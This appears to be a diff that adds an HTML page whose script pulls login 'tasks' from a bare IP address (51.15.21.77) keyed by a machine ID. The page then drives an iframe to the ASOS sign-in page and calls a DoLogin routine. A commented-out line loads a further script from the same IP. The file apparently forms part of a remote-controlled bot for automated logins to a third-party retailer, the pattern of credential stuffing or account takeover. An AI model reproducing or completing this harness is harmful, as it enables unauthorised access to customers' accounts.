@@ -1,0 +1,36 @@
+<html>
+  <body>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+    <script>
+      var machine_id = "qwe@qwe.qwe";
+      var task_url =
+        "https://51.15.21.77/nvlogin/getlogininfo?machine_id=" + machine_id;
+      var task = null;
+      $.ajax({
+        url: task_url,
+        success: function (result) {
+          if (result.status == 201) {
+            task = result.result;
+            DoTask();
+          }
+        },
+      });
+
+      function DoTask() {
+        switch (ifrm.contentWindow.location.pathname) {
+          case "blank":
+          case "/shop.html":
+            ifrm.contentWindow.location.href =
+              "https://my.asos.com/identity/login";
+            //console.log(ifrm.contentWindow.location.href);
+            break;
+          case "/identity/login":
+            DoLogin();
+            break;
+        }
+      }
+    </script>
+    <!--script src="http://51.15.21.77/pcscript.js"></!--script //-->
+    <iframe src="about:blank" width="100%" height="100%" id="ifrm"></iframe>
+  </body>
+</html>
